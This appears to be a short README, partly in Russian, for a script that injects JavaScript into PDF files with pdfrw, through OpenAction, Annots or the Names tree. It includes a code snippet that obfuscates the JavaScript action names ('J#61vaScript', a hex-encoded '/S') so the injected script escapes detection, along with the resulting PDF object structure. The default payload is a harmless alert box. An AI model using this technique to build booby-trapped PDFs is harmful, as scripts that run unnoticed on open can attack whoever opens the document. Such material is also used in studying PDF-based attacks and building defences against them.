# Inject-JavaScript-via-PDFrw-example

- Запуск с параметрами по умолчанию:

`usage: injector.py [-h] -i PATH [--script SCRIPT] [--name NAME] [--output OUT] [--inject_place INJECT_PLACE]

Inject JavaScript in PDF using PDFrw

optional arguments:
  -h, --help            show this help message and exit
  -i PATH               path/to/orig.pdf
  --script SCRIPT       path to file with JS-script; app.alert({cMsg: "Something wrong!", cTitle: "WARNING"}); by default
  --name NAME           script name if injecting in /Names; ErrorScript by default
  --output OUT          output file name; inj.pdf by default
  --inject_place INJECT_PLACE
                        [OpenAction | Annots | Names]; openaction by default`

- Пример действия в ветке Names с обфускацией:

```
names = IndirectPdfDict(**{"J#61vaScript": IndirectPdfDict(
        Names=[PdfString(script_name), IndirectPdfDict(JS=PdfString(script_code), S=PdfName('4A617661536372697074'))]
        )})
```

- Результат:

`/Names (Indirect Dict 1)` --> 

(Indirect Dict 1)

`<</J#61vaScript (Indirect Dict 2)>>` --> 

(Indirect Dict 2)

`<< /Names [(script_name), (Indirect Dict 3)` -->

(Indirect Dict 3)

`<< /JS: (script_code;), /S: /4A617661536372697074>>]>>`
